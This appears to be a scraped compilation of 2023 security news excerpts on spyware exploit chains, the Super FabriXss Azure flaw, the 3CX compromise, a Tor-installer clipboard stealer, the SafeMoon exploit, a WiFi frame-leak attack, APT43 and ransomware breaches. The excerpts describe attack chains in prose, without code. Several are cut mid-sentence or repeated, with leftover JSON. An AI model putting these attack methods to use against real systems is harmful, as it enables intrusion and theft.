Chrome versions prior to 106, and consisted of three zero-day exploits: CVE-2022-3723, CVE-2022-4135, and CVE-2022-38181.The second campaign, reported to TAG by Amnesty International, targeted zero-days and n-days in the latest version of Samsung Internet Browser (CVE-2022-4262; CVE-2023-0266). The exploit chain, Google explained, delivered a fully featured Android spyware suit written in C++ that includes libraries for decrypting and capturing data from various chat and browser applications.Stephen Weigand is managing editor and production manager for SC Media.

These goods are typically circulated through a network of resellers and money mules who help them launder the amounts.The police say it located two call centers in Vinnytsia and Lviv, which supported the fraudulent operation by communicating with the customers to convince them to place orders.The Ukrainian police have conducted over 30 searches on the members' homes, call centers, and cars, confiscating computer equipment, mobile phones, and SIM cards for examination.The Ukrainian police have conducted over 30 searches on the members' homes, call centers, and cars, confiscating computer equipment, mobile phones, and SIM cards for examination.The two arrests made in Ukraine are believed to involve organizers of the criminal gang, so the police detained them for interrogation.The arrested individuals now face criminal charges based on part 4 of Article 190 (fraud) and part 1 of Article 255 (establishment, leadership of a criminal community or criminal organization, as well as participation in it).These crimes incur a maximum penalty of 12 years in prison and confiscation of property.Another ten members of the phishing gang were detained in other European countries, where they are being questioned."

      "text": " Microsoft has patched what researchers called a \"dangerous\" flaw in its Azure Service Fabric component of the company's cloud-hosting infrastructure. If exploited, it would have allowed an unauthenticated, malicious actor to execute code on a container hosted on the platform. With Super FabriXss, a remote unauthenticated attacker can execute code on a container hosted on one of the Service Fabric nodes, which \"means that an attacker could potentially gain control of critical systems and cause significant damage,\" Lidor Ben Shitrit, cloud security researcher at Orca Security, wrote in the post.Using Super FabriXss, an attacker could craft a malicious URL that, when clicked, initiates a multi-step process eventually leading to the creation and deployment of a harmful container on one of the cluster nodes, Shitrit tells Dark Reading.Specifically, researchers demonstrated at BlueHat how they could escalate a reflected XSS vulnerability in Azure Service Fabric Explorer to an unauthenticated RCE by abusing the metrics tab and enabling a specific option in the console: the \"Cluster Type\" toggle, Shitrit wrote in the post.\"To exploit this vulnerability, a victim (an authenticated Service Fabric Explorer user) must first click on the malicious URL and then be guided to click on the Cluster Type under the Events tab,\" he explains to Dark Reading. \"Once exploited, sensitive cluster data could be revealed to the attacker, potentially allowing them to expand the attack to a larger surface.\"The vulnerability itself arises from a vulnerable \"Node Name\" parameter, which can be exploited to embed an iframe in the user's context, Shitrit said in the post. This iframe then retrieves remote files from a server controlled by the attacker, eventually leading to the execution of a malicious PowerShell reverse shell.\"This attack chain can ultimately result in remote code execution on the container [that] is deployed to the cluster, potentially allowing an attacker to take control of critical systems,\" he wrote.Orca reported the vulnerability to the Microsoft Security Response Center (MSRC) on Dec. 20, and an investigation into the issue begun later that month, on Dec. 31, the researchers said. Orca researchers and MSRC communicated several times regarding the impact of the flaw before Microsoft assigned CVE-2023-23383 to the vulnerability and issued a patch for it on March 14 that automatically fixed the issue for customers.\"With cloud-based systems, organizations often depend on third-party providers, leading to a larger attack surface and less control over security measures,\" he adds. \"Additionally, it's important to consider the multi-tenant nature of cloud environments and the significance of maintaining proper isolation between tenants.\"To address risks posed by cloud-based flaws like Super FabriXss, he suggests that organizations maintain a regime of cloud security hygiene. This includes regularly applying patches, monitoring security, addressing vulnerabilities, training employees on best practices, applying network segmentation, enforcing least-privilege permissions, collaborating with providers, and creating a robust incident response plan, Shitrit says.\"These combined efforts help ensure a secure and resilient cloud environment,\" he says.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

Fortinet captured three malware variants, indicating that it is being actively developed.The first variant establishes communication with the C2 and awaits the reception of one of the following commands:The second variant of ShellBot, which first appeared in March 2023 and already counts hundreds of victims, features a much more extensive set of commands, as shown below:Interestingly, the malware features an exploit enhancement module that aggregates news and public advisories from PacketStorm and milw0rm.The recommended action to defend against Mootbot and ShellBot is to use strong administrator passwords and apply the security updates that fix the mentioned vulnerabilities.If your device is no longer supported by its vendor, it should be replaced with a newer model to receive security updates."

Submissions will also need to include a software bill of materials, which must contain all commercial, open-source, and off-the-shelf software components, while complying with other FDA requirements “to demonstrate reasonable assurance that the device and related systems are cybersecure.”These plans should come as no surprise to device manufacturers, as they were included in the new authorities granted by the Consolidated Appropriations Act of 2023, which was signed into law on Dec. 29.The December Omnibus included statements that required the FDA to take the actions announced March 29 within 90 days of the law’s passage.

      "text": " The U.S. government is sending $25 million to the government of Costa Rica to help the country recover from a devastating ransomware attack last year that crippled several key agencies.On Wednesday, a senior White House official said that using funding from the State Department, the U.S. government would be committing $25 million to Costa Rica’s cybersecurity efforts after a direct request from Chaves. The funding will be used to secure the country’s networks and defend its critical infrastructure.“Last spring, Costa Rica experienced some of the worst ransomware attacks than any country had experienced, which really impacted the country's critical services. It disrupted their finance, telecommunications and social security institutions and resulted in President Chavez declaring a state of emergency,” the official told reporters Wednesday. “At the time, we immediately deployed a team of U.S. experts to assist in Costa Rica’s recovery and have been working closely with the country since then, and have recognized that further assistance is needed.”The funding will go toward creating a centralized security operations center within the Ministry of Science, Innovation, Technology and Communications that will work to prevent, detect and respond to cyberattacks.The center will also coordinate cybersecurity efforts across all of Costa Rica’s departments and agencies. Portions of the funding will support strategic and technical planning, cybersecurity training and capacity building as well as hardware, software, licenses and tools.Biden administration officials plan to meet with Chavez in the coming weeks to discuss the grant and broader measures to secure digital infrastructure.“President Chavez and the government believe that their strong support for Ukraine and the strong statements may have been a factor in the significant ransomware attacks,” the official said. “We recognize that supporting our allies’ and partners’ security is important in the context of the work we're doing to support our European allies and partners against Russian cyberattacks.”\nCosta Rican president Rodrigo ChavesThe $25 million would also “make such a significant difference in terms of the security operation center, helping them get facts on the ground, helping them build up the capacity to then manage it from this point on their own,” the official added.The official noted that both Albania and Costa Rica were first helped by a team of ransomware experts within the FBI – which they called the “U.S.’ core expert incident response team.”The White House official called the initiative a “cornerstone” of the Biden administration’s cybersecurity agenda and a pathway for more cyber-mature countries to “lift up so many allies and partners.”They noted that the cybersecurity efforts were key to U.S. support for democracies that now need better tools to hold secure elections, calling their work “foundational to democracy” and important in upholding “responsible cyber norms that hold malicious actors accountable.”“We thought that we could be helpful and we intentionally added a co-lead to the diplomacy panel – which is now led by Nigeria and Germany – because we want to bring in that Global South,” the official said.“So there's been outreach since October 2022 to the countries we felt could really benefit from membership. And that has resulted in the Costa Rican application.”The National Security Council, White House and State Department did not respond to requests for comment about what other countries have applied to join the initiative. The official explained that once a country applies to join, other countries can object. If there are no objections, the country is inaugurated into the initiative.When asked whether other countries were contributing funding, the official would specify but explained that several NATO members and countries across Asia were contributing money as well as expertise to broad cybersecurity efforts.“There are countries there that truly are very much in need of help. So our goal there was to say, money is one thing, expertise is very much needed as well, and to have a set of NATO countries who can commit specific capabilities,” they said, adding that more of the initiatives will be revealed at a summit in the Lithuanian capital of Vilnius this summer.Jonathan Greig is a Breaking News Reporter at Recorded Future News.

In a later statement, 3CX confirmed that the 18.11.1213, 18.12.402, 18.12.407 & 18.12.416 versions of the Mac client were infected.BleepingComputer confirmed this same certificate was used in older versions of 3CX software.SentinelOne detects \"penetration framework or shellcode\" while analyzing the 3CXDesktopApp.exe binary, ESET tags it as a \"Win64/Agent.CFM\" trojan, Sophos as \"Troj/Loader-AF\", and CrowdStrike's Falcon OverWatch managed threat hunting service warns users to investigate their systems for malicious activity \"urgently.\"A 3CX spokesperson didn't reply to a request for comment when BleepingComputer reached out earlier today.\"We are going to analyze and issue a full report later on today. Right now we are just focusing on the update.\"In a blog post about the incident, 3CX CISO Pierre Jourdan states that its desktop apps were compromised due to an upstream library.\"The issue appears to be one of the bundled libraries that we compiled into the Windows Electron App via GIT,\" explains Jourdan in the blog post.\"We’re still researching the matter to be able to provide a more in depth response later today. Here’s some information on what we’ve done so far.\"However, 3CX has yet to share what library they are referring to and whether it led to their developer environment becoming compromised.BleepingComputer has reached out to 3CX with further questions about the incident."

      "text": " Threat actors are using Trojanized installers for The Onion Router (Tor) browser to distribute clipboard-injector malware that pilfers funds from cryptocurrency accounts and transfers it to their illicit wallets.\"Given that we only see a fraction of the real picture, the global number of infections may well be several or even tens of times higher,\" Kaspersky warned in a report this week.Clipboard injector malware, aka a clipboard hijacker, intercepts and replaces the contents of a user's clipboard with malicious code or content. This type of malware is not new, it has been around for at least a decade. Over the past few years, cybercriminals have typically used the malware to replace cryptocurrency wallet information from a user's clipboard with their own crypto information — and then transferring coins from the victim's wallet to their own.Though seemingly straightforward, clipboard injector tools can be hard to detect and handle, Kaspersky said. They don't exhibit any of the more obvious behaviors associated with typical malware such as communicating with an external system, causing pop ups, or slowing down an infected system. They often blend in with legitimate clipboard activity and any data that the malware replaces can be hard to detect because of how frequently data in a clipboard gets overwritten in the normal course of events.\"[Clipboard injectors] can be silent for years, show no network activity, or any other signs of presence until the disastrous day when they replace a crypto wallet address,\" Kaspersky said.Threat actors so far have typically used phishing emails, malicious websites, and other malware to distribute clipboard hijackers.The campaign to distribute it via weaponized Tor installers is a spin that Kaspersky surmised was likely inspired by Russia's move to ban access to the browser.Tor gives individuals a way to browse the Internet anonymously by routing their traffic through a network of volunteer-run servers around the world. Frequent Tor users — apart from cybercriminals — include human rights activities, journalists, and those seeking to circumvent censorship and surveillance. Tor has previously described Russia as a country with over 300,000 daily Tor users.According to Kaspersky, threat actors began distributing Trojanized Tor bundles to Russian-speaking users in December 2021, soon after the country's move to block access. The bundles typically consist of the original torbrowser dot exe installer with a valid Tor Project digital signature, a command-line extraction tool in the RAR archive form with a randomized name, and a password-protected RAR archive.When a user downloads the weaponized Tor browser bundle, the original torbrowser executable runs in the foreground. In the background, it also runs the extraction tool on the password-protected RAR archive, which sets into motion a set of actions that ends with the clipboard injector malware installed on the victim system.The authors of the malware likely have used a cracked version of Enigma, a commercially available software protector, to pack the malware and make it harder to detect.Once installed, the \"malware integrates into the chain of Windows clipboard viewers and receives a notification every time the clipboard data is changed,\" Kaspersky said.If the malware detects cryptocurrency information in the clipboard, it replaces the content with an attacker-controlled address for Bitcoin or another cryptocurrency. Kaspersky researchers who analyzed various samples of the malware found each sample to contain thousands of replacement addresses making it hard for defenders to create a deny list or to trace cryptocurrency theft, the security vendor said.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

I want to assure you that the other LP pools on the DEX have not been affected, and nor have any of our upcoming upgrades and releases.\"Karony previously stated that this system would only be used for emergencies, like when the liquidity pool would face risks with malicious smart contracts, excessive slippage, and other transient losses.The hacker utilized the function to burn large amounts of SafeMoon tokens, causing the price of the token to shoot up in price.As soon as the price increased, another address sold SafeMoon at the manipulated price, draining $8.9 million from the SafeMoon:WBNB liquidity pool.A few hours after the attack, the actor who converted the SafeMoon to BNB claimed they were not the initial hacker but \"accidentally performed a front run\" after the price was artificially inflated due to the exploit of the burn() function.\"Hey relax, we are accidently frontrun an attack against you, we would like to return the fund, setup secure communication channel , lets talk,\" said a comment added to the transaction.Since then, the person has transferred 4,000 Binance Coins (BNB), worth $1,264,440.00, to another address, making the frontrun look less accidental."

Washington County has more than 25,000 residents and is about 45 minutes away from Panama City, Florida.A spokesperson for the sheriff’s office confirmed that they were hit with ransomware and said it “recovered” from the incident about two weeks ago.“We believe the attack originated in Russia. We aren’t absolutely sure but we believe it to be,” Sheriff Kevin Crews said. “We are grateful our communication lines never went down. We never lost our phone lines and were able to continue to serve our community in that arena.”The department’s app was offline from February 21 until early March due to the attack, which took down their finance system and jail networks. They hired a private IT company to help with the recovery effort.\nA post on LockBit's extortion siteThe LockBit ransomware group took credit for the attack on February 27 and threatened to leak the data by March 20. The group removed the sheriff’s office briefly before reposting it on Tuesday, leaking all of the data the group stole.The sheriff’s office would only say that it spent less than $20,000 on IT and database recovery services.LockBit was tied to 129 ransomware attacks in February – a 150% spike in the group’s activity compared to January.“Looking at the most prevalent threat actors, Lockbit 3.0 looks set to carry on where it left off in 2022, and is already leading the way as 2023’s most prevalent threat actor by some margin,” said Matt Hull, global head of threat intelligence at NCC Group.Jonathan Greig is a Breaking News Reporter at Recorded Future News.

      "text": " Google's findings this week show that those efforts have done little to thwart the commercial-spyware scene, and \"underscore the extent to which commercial surveillance vendors have proliferated capabilities historically only used by governments with the technical expertise to develop and operationalize exploits,\" TAG researchers wrote in the post.Specifically, the researchers discovered what they characterize as two \"distinct, limited, and highly targeted\" campaigns aimed at users of Android, iOS, and Chrome on mobile devices. Both use zero-day exploits and n-day exploits. Regarding the latter, the campaigns take particular advantage of the period of time between when vendors release fixes for vulnerabilities and when the hardware manufacturers actually update end-user devices with those patches, creating exploits for unpatched platforms, the researchers said.This demonstrates that those creating the exploits are keeping a close eye on vulnerabilities that they can exploit for nefarious purposes and are likely colluding to maximize the potential for using them to compromise targeted devices, according to TAG. The campaigns also suggest that surveillance software vendors share exploits and techniques to enable the proliferation of dangerous hacking tools, the researchers wrote in the post.The first campaign that researchers outlined was discovered in November and exploits two vulnerabilities in iOS and three in Android, including at least one zero-day flaw each.The final payload of the iOS campaign was a simple stager that pings back the GPS location of the device and also allows the attacker to install an .IPA file (iOS application archive) onto the affected handset, researchers said. This file can be used to steal information.Google TAG researchers discovered the second campaign, which includes a complete exploit chain using both zero-days and n-days to target the latest version of Samsung Internet Browser, in December. The browser runs on Chromium 102 and has not been updated to include recent mitigations, which would have required attackers to do additional work to carry out the exploit, the researchers said.The payload of the exploit in this case was a C++-based, \"fully-featured Android spyware suite\" that included libraries for decrypting and capturing data from various chat and browser applications, the researchers wrote. They suspect that the actor involved may be a customer, partner, or otherwise close affiliate of Variston.\"The exploit chain also took advantage of multiple kernel information leak zero-days when exploiting CVE-2022-22706 and CVE-2023-0266\" that Google reported to ARM and Samsung, the researchers wrote.TAG researchers provided a list of indicators of compromise (IoC) to help device users know if they're being targeted by the campaigns. They also stressed how important it is for vendors as well as users to update their mobile devices with the latest patches as quickly as possible after vulnerabilities and/or exploits for them are discovered.\"A big takeaway here would be to use fully updated software on fully updated devices,\" Google TAG researchers say in response to questions posed by Dark Reading. \"In this case, none of the exploit chains described would have worked.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": "  A New York-based medical malpractice law firm has agreed to pay $200,000 to the New York Attorney General over inadequate data security practices that led to the now-infamous Microsoft Exchange attacks in 2021.  In November 2021, months after Microsoft issued patches for vulnerabilities in its servers, the attackers gained access to unpatched systems for legal firm Heidell, Pittoni, Murphy & Bach (HPMB) and compromised the private data of nearly 115,000 hospital patients, including names, dates of birth, social security numbers, and health information.  In addition to the financial penalty, HPMB has agreed to improve its security measures — including establishing an appropriate patch management program, conducting annual risk analysis, encrypting private and health information, and securely deleting ePHI and private information when appropriate— to protect its clients' patients' data in the future.  \"Confidential patient information should be treated with care and secured online to protect New Yorkers from identity theft and fraud. The institutions charged with protecting this information have a responsibility to get it right, and to keep authorities and New Yorkers informed about breaches,\" James added.  SC Media has reached out to the law firm for comment.  On or around Christmas, the attacker deployed Lockbit ransomware on HPMB's network. While the company hired a forensic firm to negotiate, the attackers provided a list of tens of thousands of files that they claimed to have stolen from the HPMB’s systems, including legal pleadings, patient lists, and medical records, which the forensic firm later confirmed were indeed exfiltrated from the law firm, the investigation found.  On May 16, 2022, HPMB's vendor concluded the information of 114,979 hospital patients, including 61,438 New York residents, has likely been exposed. The law firm started notifying affected parties while reporting the incident to the U.S. Department of Health and Human Services on the same day. Menghan Xiao is a cybersecurity reporter at SC Media, covering software supply chain security, workforce/business, and threat intelligence.

Additionally, the malware uses a uTorrent icon to hide on the breached system.Kaspersky has detected 16,000 variants of these Tor installers between August 2022 and February 2023 in 52 countries, based on data from users of its security products.While the majority are targeting Russia and Eastern Europe, they have also been seen targeting the United States, Germany, China, France, the Netherlands, and the UK.As cryptocurrency addresses are long and complicated to type, it is common to copy them first to the clipboard and then paste them into another program or website.The malware monitors the clipboard for recognizable crypto wallet addresses using regular expressions, and when one is detected, replaces it with an associated cryptocurrency address owned by the threat actors.When the user pastes the cryptocurrency address, the threat actor's address will be pasted instead, allowing the attackers to steal the sent transaction.Kaspersky says the threat actor uses thousands of addresses on each malware sample, selected randomly from a hardcoded list. This makes wallet tracking, reporting, and banning hard.The cybersecurity company unpacked hundreds of malware samples it had collected to extract the replacement addresses and found that they stole almost $400,000, excluding Monero, which cannot be traced.This is the money stolen only from a single campaign operated by a specific malware author, and there are almost certainly other campaigns using trojanized installers for different software.A simple test to check if a clipper has infected you is to copy and paste this address to your Notepad: bc1heymalwarehowaboutyoureplacethisaddress.If it is changed, it means your system is compromised."

      "text": " Cybersecurity researchers have discovered a fundamental security flaw in the design of the IEEE 802.11 WiFi protocol standard, allowing attackers to trick access points into leaking network frames in plaintext form.WiFi frames are data containers consisting of a header, data payload, and trailer, which include information such as the source and destination MAC address, control, and management data.These frames are ordered in queues and transmitted in a controlled matter to avoid collisions and to maximize data exchange performance by monitoring the busy/idle states of the receiving points.The researchers found that queued/buffered frames are not adequately protected from adversaries, who can manipulate data transmission, client spoofing, frame redirection, and capturing.\"Our attacks have a widespread impact as they affect various devices and operating systems (Linux, FreeBSD, iOS, and Android) and because they can be used to hijack TCP connections or intercept client and web traffic,\" reads the technical paper published yesterday by Domien Schepers and Aanjhan Ranganathan of Northeastern University, and Mathy Vanhoef of imec-DistriNet, KU Leuven.The IEEE 802.11 standard includes power-save mechanisms that allow WiFi devices to conserve power by buffering or queuing frames destined for sleeping devices.When a client station (receiving device) enters sleep mode, it sends a frame to the access point with a header that contains the power-saving bit, so all frames destined for it are queued.The standard, however, does not provide explicit guidance on managing the security of these queued frames and does not set limitations like how long the frames can stay in this state.Once the client station wakes up, the access point dequeues the buffered frames, applies encryption, and transmits them to the destination.An attacker can spoof the MAC address of a device on the network and send power-saving frames to access points, forcing them to start queuing frames destined for the target. Then, the attacker transmits a wake-up frame to retrieve the frame stack.The transmitted frames are usually encrypted using the group-addressed encryption key, shared among all the devices in the WiFi network, or a pairwise encryption key, which is unique to each device and used to encrypt frames exchanged between two devices.However, the attacker can change the security context of the frames by sending authentication and association frames to the access point, thus forcing it to transmit the frames in plaintext form or encrypt them with an attacker-provided key.The researchers report that network device models from Lancom, Aruba, Cisco, Asus, and D-Link are known to be affected by these attacks, with the complete list below.The researchers warn that these attacks could be used to inject malicious content, such as JavaScript, into TCP packets.\"An adversary can use their own Internet-connected server to inject data into this TCP connection by injecting off-path TCP packets with a spoofed sender IP address,\" warn the researchers.\"This can, for instance, be abused to send malicious JavaScript code to the victim in plaintext HTTP connections with as goal to exploit vulnerabilities in the client's browser.\"While this attack could also be used to snoop on traffic, as most web traffic is encrypted using TLS, there would be a limited impact.The first vendor to acknowledge the impact of the WiFi protocol flaw is Cisco, admitting that the attacks outlined in the paper may be successful against Cisco Wireless Access Point products and Cisco Meraki products with wireless capabilities.However, Cisco believes says that the retrieved frames are unlikely to jeopardize the overall security of a properly secured network.Still, the firm recommends applying mitigation measures like using policy enforcement mechanisms through a system like Cisco Identity Services Engine (ISE), which can restrict network access by implementing Cisco TrustSec or Software Defined Access (SDA) technologies.Currently, there are no known cases of malicious use of the flaw discovered by the researchers."

      "text": " Cybercriminal group Kimsuky has evolved into a full-fledged, persistent threat, carrying out \"unusually aggressive\" social-engineering attacks aimed at gathering intelligence, and stealing and laundering cryptocurrency to support the North Korean government.Now, however, Mandiant researchers have found that APT43 is evolving in several ways.For one, the group is now following in the shoes of other North Korean APTs and branching out beyond mere cyber espionage to steal cryptocurrency, the researchers have found. In addition to using the ill-gotten currency to fund the regime of Kim Jong-un, as other groups do, APT43 also uses it to bolster its own activities, they said.The group is even going the extra step of laundering the crypto through legitimate cloud-mining services so it comes out as clean currency and is difficult to track — an activity that might be used by other groups, but has flown under the radar until now, the researchers said.\"The washing of funds and the 'how' has been the missing piece of the equation,\" notes Michael Barnhart, Mandiant principal analyst at Google Cloud. \"We have indications that APT43 utilizes specific hash rental services to launder these funds by mining for different cryptocurrencies.\"For a small fee, these services provide hash power, which APT43 uses to mine cryptocurrency to a wallet selected by the buyer without any blockchain-based association to the buyer's original payments. This allows the APT to use stolen funds to mine for a different cryptocurrency, the researchers said. By spending very little, threat actors walk away with untracked, clean currency to do as they wish, Barnhart explains.Moreover, APT43 — while technologically unsophisticated — relies on advanced and persistent social-engineering tactics in which threat actors create convincing fake personas and exhibit patience in building relationships with targets over several weeks without using malware, the researchers said.\"I've never seen an APT quite as successful with such novel techniques,\" Barnhart notes. \"They pretend to be subject-matter experts or reporters and ask targeted questions — often with the promise of quoting the victim in a report or news article — and successfully gain feedback.\"Indeed, in some instances, attackers successfully convinced targeted victims to send over proprietary, geopolitical analysis and research without deploying malware at all, the researchers said.This deviates from standard procedure for most threat groups, allowing APT43 to expend little effort or resources in building malware and gaining the information they are seeking in a low-fi way — by merely asking victims for it, Barnhart notes.APT43 has shifted its targets, and the malware it uses, in campaigns over the years in response to the demands of the North Korean government and the cyberespionage activities it requires of the group, according to Mandiant.\"APT43 ultimately modifies its targeting and tactics, techniques, and procedures (TTPs) to suit its sponsors, including carrying out financially-motivated cybercrime as needed to support the regime,\" the researchers said in the report.For example, prior to October 2020, the group primarily targeted US and South Korean government offices, diplomatic organizations, and think tank-related entities with a stake in foreign policy and security issues affecting the Korean peninsula. Over the next year, however, the group shifted its focus to COVID-19 response efforts in North Korea by targeting health-related verticals and pharmaceutical companies in South Korea, the US, Europe, and Japan.One notable difference that has emerged between the group and other North Korean threat actors is a recent shift to expand, targeting \"everyday users\" based on \"the sheer velocity and volume of attacks,\" says Joe Dobson, Mandiant principal analyst.\"By spreading their attack out across hundreds, if not thousands, of victims, their activity becomes less noticeable and harder to track than hitting one large target,\" he says. \"Their pace of execution, combined with their success rate, is alarming.\"APT43 is aiming its high-volume activity at entities and organizations in government, business services, and manufacturing as well as think tanks and organizations in education and research related to geopolitical and nuclear policy in the US, South Korea, and Japan, the researchers said.Given its advanced social-engineering tactics and tendency to go after both specific individuals and wider-net targets, researchers advised organizations that may be at risk to share with their employees \"a greater understanding of cyber hygiene and heightened awareness,\" Barnhart says. \"It's important to make personnel aware of this threat actor's TTPs,\" Barnhart says.He adds that the APT's spoofed emails are highly convincing, which makes them difficult to spot, even for savvy users; thus, organizations at risk should be on high alert.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

We can confirm no customer data has been compromised, and our business operations have not been impacted.\"The gambling and entertainment company says they will continue to work with law enforcement to continue the investigation of the security incident and will provide updates if new evidence surfaces.Clop is still extorting the victims by threatening to release the data it stole from their networks but has not yet leaked anything on its data leak site.Although Fortra offered the plaintiff, a Hatch Bank customer, one year of free identity monitoring and fraud protection services, the gesture is dismissed as insufficient to mitigate the lifetime risk of personal data exposure.The Clop ransomware gang has a history of exploiting zero-day flaws to steal data from companies and perform massive extortion waves."

      "text": " Freelance JournalistDiscussing the findings in an advisory published today, the company said the attacks were first observed in September 2022 and relied on malware replacing part of the clipboard contents with cryptocurrency wallet addresses.Kaspersky added that this is particularly true when considering that while worms and viruses may not necessarily connect to the attacker’s control servers, they often generate visible network activity or increase CPU or RAM usage.“So does encrypting ransomware. Clipboard injectors, on the contrary, can be silent for years, show no network activity or any other signs of presence until the disastrous day when they replace a crypto wallet address,” the company explained.Kaspersky added that the malware campaign relying on this technique was observed abusing Tor Browser installers.“We relate this to the ban of Tor Project’s website in Russia at the end of 2021, which was reported by the Tor Project itself [...] Malware authors heard the call and responded by creating trojanized Tor Browser bundles and distributing them among Russian-speaking users.”As for the payload observed during the malicious campaign, Kaspersky explained it was a passive and communication-less clipboard-injector malware.“The malware integrates into the chain of Windows clipboard viewers and receives a notification every time the clipboard data is changed,” reads the advisory. “If the clipboard contains text, it scans the contents with a set of embedded regular expressions. Should it find a match, it is replaced with one randomly chosen address from a hardcoded list.”The clipboard-injector mainly targeted systems in Russia and Eastern Europe, but also in the US, Germany and China, among others.To mitigate the impact of this threat, Kaspersky advised system defenders to download software from only reliable and trusted sources.“A mistake likely made by all victims of this malware was to download and run Tor Browser from a third-party resource,” the company explained. “The installers coming from the official Tor Project were digitally signed and didn’t contain any signs of such malware.”"

      "text": " The leaked code was contained in four folders. Though inaccessible as of March 24, some of the folder names — like \"auth\" and \"aws-dal-reg-svc\" — seem to give some hint at what they contained within.According to Ars Technica, FreeSpeechEnthusiast joined Github on Jan. 3 and committed all the leaked code that same day. That means, in all, the code was entirely accessible to the public for nearly three months.Major software companies are built on millions of lines of code and every so often, for one reason or another, some of it can leak.Hackers aren't always a part of the story, though. In Twitter's case, circumstantial evidence points to a dissatisfied employee. And \"a good deal of it also comes from code ending up where it does not belong unintentionally, as we saw with Toyota, where a subcontractor made a copy of a private codebase public,\" he adds. \"The complexity of working with git and CI/CD combined with an ever-growing number of repos to deal with for modern applications means code on private repos can become public by mistake.\"For Twitter and companies like it, source code leaks can be a much bigger problem for cybersecurity than copyright infringement. Once a private repository becomes public, all kinds of harm can follow.\"It's important to remember that source repositories often contain more than just the code,\" notes Tim Mackey, principal security strategist for the Synopsys Cybersecurity Research Center. \"You'll find test cases, potentially sample data along with details on how the software should be configured.\"There may also be sensitive personal information and authentication information hidden in the code. For example, \"for some applications that are never intended to be shipped to customers, the default configuration contained in the source code repository might just be the running configuration,\" Mackey says. Hackers can use stolen authentication and configuration data to carry out bigger and better attacks against the victim of a leak.That's why \"companies should adopt a more secure secrets management strategy, combining secrets storage with secrets detection,\" says GitGuardian's McDaniel. \"Organizations should also audit their current secret[s] leakage situation to know what systems are at risk if a code leak does occur and where to focus prioritization.\"But in cases where the leak comes from the inside — like Twitter's — even greater caution is warranted. It requires thorough threat modeling and analysis of an enterprise's source code management, says Mackey.\"This is important because if someone can trigger a source code leak, then they may also have the ability to change the source code,\" he says. \"If you're not using multifactor authentication for access, enforcing limited access to only approved users, enforcing access rights, and access monitoring, then you may not have a full picture of how someone might exploit the assumptions your development teams have made when they secured their source code repository.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " A vulnerability in a commonly used file transfer service called GoAnywhere has allowed the Clop ransomware group to breach about 130 organizations. Weeks later, details are still emerging about the sprawling attack.For its part, Forta has remained publicly quiet about the steady stream of disclosures. But today, it gave Dark Reading a statement with reassurances that it's committed to helping its customers navigate what is evolving into a communications, as well as a cybersecurity, crisis for the company.\"On January 30, 2023, we were made aware of suspicious activity within certain instances of our GoAnywhere MFTaaS solution,\" Fortra says in a statement issued to Dark Reading. \"We immediately took multiple steps to address this, including implementing a temporary outage of this service to prevent any further unauthorized activity, and sharing mitigation guidance, which includes instructions to our on-prem customers about applying a developed patch.\"Fortra added that it remains committed to supporting its affected users.\"We are working diligently to notify customers who may have been impacted and we coordinated with CISA to add information about this vulnerability to their CVE catalog to broaden the reach of information about this issue,\" Fortra's spokesperson's statement adds. \"We are taking this very seriously and continue to help our customers implement mitigation steps to address this issue.\"\"This one wasn't communicated well, challenging even the best security teams to respond,\" Heath Renfrow, co-founder of Fenix24 tells Dark Reading in response to the freshly issued statement from Fortra. \"This is a good example of how it is necessary for security professionals to have multiple sources of threat intelligence — beyond just their providers — to cover every base. That said, it has been communicated now and anyone using the solution should patch immediately.\"Slow communication can be especially detrimental in a software supply chain attack scenario, Dirk Schrader, vice president of security research at Netwrix said.\"To prevent further evolvement of a supply chain attack, it is crucial for the first victim in line to communicate openly and in detail about what happened,\" he noted via email. \"It helps other links in this chain to be prepared for an upcoming threat and minimizes possible damage. It is likely that the current attack was accelerated due to details about this zero-day not being disclosed in a timely manner.\"Dark Reading asked Fortra for a response to the criticism of its handling of the cybersecurity incident but has not received a response. Meanwhile, Forta's customer, the City of Toronto, when asked about its communications with Fortra regarding the breach, gave a simple response by email: \"Fortra has been communicating with the City and continues to do so.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " Microsoft is introducing a new Exchange Online security feature that will automatically start throttling and eventually block all emails sent from \"persistently vulnerable Exchange servers\" 90 days after the admins are pinged to secure them. As Redmond explains, these are Exchange servers in on-premises or hybrid environments that run end-of-life software or haven't been patched against known security bugs.\"Any Exchange server that has reached end of life (e.g., Exchange 2007, Exchange 2010, and soon, Exchange 2013), or remains unpatched for known vulnerabilities,\" The Exchange Team explained.\"For example, Exchange 2016 and Exchange 2019 servers that are significantly behind on security updates are considered persistently vulnerable.\"Microsoft says this new Exchange Online \"transport-based enforcement system\" has three distinct functions: reporting, throttling, and blocking.The new system's primary goal is to help Exchange admins identify unpatched or unsupported on-prem Exchange servers, allowing them to upgrade or patch them before they become security risks.However, it will also be able to throttle and eventually block emails from Exchange servers that haven't been remediated before reaching Exchange Online mailboxes.This new enforcement system will only affect servers running Exchange Server 2007 using OnPremises connectors to send mail, to allow for fine-tuning before expanding to all Exchange versions (regardless of how they connect to Exchange Online).Redmond says it follows a progressive approach designed to gradually increase throttling and introduce email blocking until all emails sent from vulnerable servers are rejected.These enforcement actions are designed to slowly escalate until the vulnerable Exchange servers are remediated by removal from service (for end-of-life versions) or patched (in the case of releases still under support).\"The enforcement system is designed to alert admins about security risks in their environment, and to protect Exchange Online recipients from potentially malicious messages sent from persistently vulnerable Exchange servers.\"For some admins, ensuring that emails sent from vulnerable servers in their environment to Exchange Online mailboxes will not get automatically blocked will likely be another \"incentive\" that will add to their ongoing effort to keep end-users protected against potential attacks."

      "title": "Drive to Pervasive Encryption Boosts Key Management",
